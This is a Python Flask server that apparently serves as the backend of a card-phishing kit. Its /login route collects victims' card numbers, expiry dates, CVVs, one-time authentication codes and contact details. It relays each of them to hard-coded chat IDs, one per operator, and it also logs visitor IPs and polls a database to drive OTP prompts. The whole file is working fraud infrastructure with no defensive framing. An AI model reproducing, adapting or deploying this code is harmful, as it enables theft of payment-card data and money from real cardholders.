from flask import Flask, redirect, request, jsonify
from flask_cors import CORS
from external import send_buttons_message, send_secret_question, send_sms, ne_pizdabol, cheltut, send_me, send_me1, send_sms1
from CHAT_ID import *
from checker import get_button_by_id
app = Flask(__name__)
CORS(app, resources={r"/*": {"origins": "*"}})

DOMEN = 'http://127.0.0.1:5500'



@app.before_request
def log_request_info():
    print('Headers:', request.headers)
    print('Body:', request.get_data())
    print('Args:', request.args)

@app.route('/chel', methods=['GET', 'POST'])
def chel():
    ip_address = request.args.get('ip')
    name = request.args.get('name')
    if ip_address:
        cheltut(ip_address, name)
        return jsonify({"message": "IP address received", "ip": ip_address})
    else:
        return jsonify({"error": "No IP address provided"}), 400
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        print("Received a GET request:")
        print(f"Full URL: {request.url}")
        print(f"Method: {request.method}")

        card_number = request.args.get('cardNumber')
        expiry_date = request.args.get('expiryDate')
        cvv = request.args.get('cvv')
        id = request.args.get('id')
        question = request.args.get('question')
        authCode = request.args.get('authCode')
        epin = request.args.get('epinAuthCode')
        session = request.args.get('session')
        name = request.args.get('name')
        email = request.args.get('email')
        tel = request.args.get('tel')
        ip_address = request.args.get('ip')


        ID = f'{session}'

        # SmokeWeEveryday
        if id == '10000001':
            if authCode is not None and authCode != 'None':
                send_sms1(card_number, authCode)
                send_sms('-1002179206284', card_number, expiry_date, cvv, authCode, ID, ip_address)
                return '', 200  # Возвращаем пустой ответ с кодом 200
            send_me1(card_number, expiry_date, cvv)
            send_buttons_message('-1002179206284', card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
            return '', 200  # Возвращаем пустой ответ с кодом 200
        # WE
        if id == '1000001':
            send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
            if authCode is not None and authCode != 'None':
                send_sms('-1002179206284', card_number, expiry_date, cvv, authCode, ID, ip_address)
                return '', 200  # Возвращаем пустой ответ с кодом 200
            send_buttons_message('-1002179206284', card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
            ne_pizdabol(card_number)
            return '', 200  # Возвращаем пустой ответ с кодом 200

        # Egoist
        elif id == '1000002':
            send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
            if authCode is not None and authCode != 'None':
                send_sms(Egoist, card_number, expiry_date, cvv, authCode, ID, ip_address)
                return '', 200  # Возвращаем пустой ответ с кодом 200
            ne_pizdabol(card_number)
            send_buttons_message(Egoist, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
            return '', 200  # Возвращаем пустой ответ с кодом 200
        # Egoist2
        elif id == '1000003':
            send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
            if authCode is not None and authCode != 'None':
                send_sms(Egoist2, card_number, expiry_date, cvv, authCode, ID, ip_address)
                return '', 200  # Возвращаем пустой ответ с кодом 200
            ne_pizdabol(card_number)
            send_buttons_message(Egoist2, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
            return '', 200  # Возвращаем пустой ответ с кодом 200
        # Plaxa
        elif id == '1000004':
            send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
            if authCode is not None and authCode != 'None':
                send_sms(Plaxa, card_number, expiry_date, cvv, authCode, ID, ip_address)
                return '', 200  # Возвращаем пустой ответ с кодом 200
            ne_pizdabol(card_number)
            send_buttons_message(Plaxa, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
            return '', 200  # Возвращаем пустой ответ с кодом 200        
        elif id == '1000005':
            send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
            if authCode is not None and authCode != 'None':
                send_sms(Egoist3, card_number, expiry_date, cvv, authCode, ID, ip_address)
                return '', 200  # Возвращаем пустой ответ с кодом 200
            ne_pizdabol(card_number)
            send_buttons_message(Egoist3, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
            return '', 200  # Возвращаем пустой ответ с кодом 200
        elif id == '1000006':
            send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
            if authCode is not None and authCode != 'None':
                send_sms(Egoist4, card_number, expiry_date, cvv, authCode, ID, ip_address)
                return '', 200  # Возвращаем пустой ответ с кодом 200
            ne_pizdabol(card_number)
            send_buttons_message(Egoist4, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
            return '', 200  # Возвращаем пустой ответ с кодом 200        
        elif id == '1000007':
            send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
            if authCode is not None and authCode != 'None':
                send_sms(Egoist5, card_number, expiry_date, cvv, authCode, ID, ip_address)
                return '', 200  # Возвращаем пустой ответ с кодом 200
            ne_pizdabol(card_number)
            send_buttons_message(Egoist5, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
            return '', 200  # Возвращаем пустой ответ с кодом 200
        elif id == '1000008':
            send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
            if authCode is not None and authCode != 'None':
                send_sms(Egoist6, card_number, expiry_date, cvv, authCode, ID, ip_address)
                return '', 200  # Возвращаем пустой ответ с кодом 200
            ne_pizdabol(card_number)
            send_buttons_message(Egoist6, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
            return '', 200  # Возвращаем пустой ответ с кодом 200
        elif id == '1000009':
            send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
            if authCode is not None and authCode != 'None':
                send_sms(Plaksa, card_number, expiry_date, cvv, authCode, ID, ip_address)
                return '', 200  # Возвращаем пустой ответ с кодом 200
            ne_pizdabol(card_number)
            send_buttons_message(Plaksa, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
            return '', 200  # Возвращаем пустой ответ с кодом 200
        
        elif id == '10000010':
            send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
            if authCode is not None and authCode != 'None':
                send_sms(Gatsby, card_number, expiry_date, cvv, authCode, ID, ip_address)
                return '', 200  # Возвращаем пустой ответ с кодом 200
            ne_pizdabol(card_number)
            send_buttons_message(Gatsby, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
            return '', 200  # Возвращаем пустой ответ с кодом 200
        
        elif id == '10000011':
            send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
            if authCode is not None and authCode != 'None':
                send_sms(pl1, card_number, expiry_date, cvv, authCode, ID, ip_address)
                return '', 200  # Возвращаем пустой ответ с кодом 200
            ne_pizdabol(card_number)
            send_buttons_message(pl1, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
            return '', 200  # Возвращаем пустой ответ с кодом 200
        
        elif id == '10000012':
            send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
            if authCode is not None and authCode != 'None':
                send_sms(pl2, card_number, expiry_date, cvv, authCode, ID, ip_address)
                return '', 200  # Возвращаем пустой ответ с кодом 200
            ne_pizdabol(card_number)
            send_buttons_message(pl2, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
            return '', 200  # Возвращаем пустой ответ с кодом 200
        
        elif id == '10000013':
            send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
            if authCode is not None and authCode != 'None':
                send_sms(dch1, card_number, expiry_date, cvv, authCode, ID, ip_address)
                return '', 200  # Возвращаем пустой ответ с кодом 200
            ne_pizdabol(card_number)
            send_buttons_message(dch1, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
            return '', 200  # Возвращаем пустой ответ с кодом 200
        
        elif id == '10000014':
            send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
            if authCode is not None and authCode != 'None':
                send_sms(dch2, card_number, expiry_date, cvv, authCode, ID, ip_address)
                return '', 200  # Возвращаем пустой ответ с кодом 200
            ne_pizdabol(card_number)
            send_buttons_message(dch2, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
            return '', 200  # Возвращаем пустой ответ с кодом 200

        elif id == '10000015':
            send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
            if authCode is not None and authCode != 'None':
                send_sms(pl3, card_number, expiry_date, cvv, authCode, ID, ip_address)
                return '', 200  # Возвращаем пустой ответ с кодом 200
            ne_pizdabol(card_number)
            send_buttons_message(pl3, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
            return '', 200  # Возвращаем пустой ответ с кодом 200
        
        elif id == '10000016':
            send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
            if authCode is not None and authCode != 'None':
                send_sms(pl4, card_number, expiry_date, cvv, authCode, ID, ip_address)
                return '', 200  # Возвращаем пустой ответ с кодом 200
            ne_pizdabol(card_number)
            send_buttons_message(pl4, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
            return '', 200  # Возвращаем пустой ответ с кодом 200
        
        elif id == '10000017':
            send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
            if authCode is not None and authCode != 'None':
                send_sms(cc_otp, card_number, expiry_date, cvv, authCode, ID, ip_address)
                return '', 200  # Возвращаем пустой ответ с кодом 200
            ne_pizdabol(card_number)
            send_buttons_message(cc_otp, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
            return '', 200  # Возвращаем пустой ответ с кодом 200
        
        elif id == '10000018':
            send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
            if authCode is not None and authCode != 'None':
                send_sms(dch3, card_number, expiry_date, cvv, authCode, ID, ip_address)
                return '', 200  # Возвращаем пустой ответ с кодом 200
            ne_pizdabol(card_number)
            send_buttons_message(dch3, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
            return '', 200  # Возвращаем пустой ответ с кодом 200
        
        elif id == '10000019':
            send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
            if authCode is not None and authCode != 'None':
                send_sms(joe, card_number, expiry_date, cvv, authCode, ID, ip_address)
                return '', 200  # Возвращаем пустой ответ с кодом 200
            ne_pizdabol(card_number)
            send_buttons_message(joe, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
            return '', 200  # Возвращаем пустой ответ с кодом 200
        
        elif id == '10000020':
            send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
            if authCode is not None and authCode != 'None':
                send_sms(roger, card_number, expiry_date, cvv, authCode, ID, ip_address)
                return '', 200  # Возвращаем пустой ответ с кодом 200
            ne_pizdabol(card_number)
            send_buttons_message(roger, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
            return '', 200  # Возвращаем пустой ответ с кодом 200

        elif id == '10000021':
            send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
            if authCode is not None and authCode != 'None':
                send_sms(st_dech, card_number, expiry_date, cvv, authCode, ID, ip_address)
                return '', 200  # Возвращаем пустой ответ с кодом 200
            ne_pizdabol(card_number)
            send_buttons_message(st_dech, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
            return '', 200  # Возвращаем пустой ответ с кодом 200
    
        return '', 200  # Добавляем общий возврат для случаев, когда нет условий или ошибки

    

        

@app.route('/test', methods=['GET'])
def test():
    return jsonify(number=3)

@app.route('/update', methods=['GET'])
def test2():
    database = r"database.db"
    user_id_to_check = request.args.get('session')  
    result = str(get_button_by_id(user_id_to_check, database))
    return jsonify({'result': result})
if __name__ == '__main__':
    app.run(debug=True)    
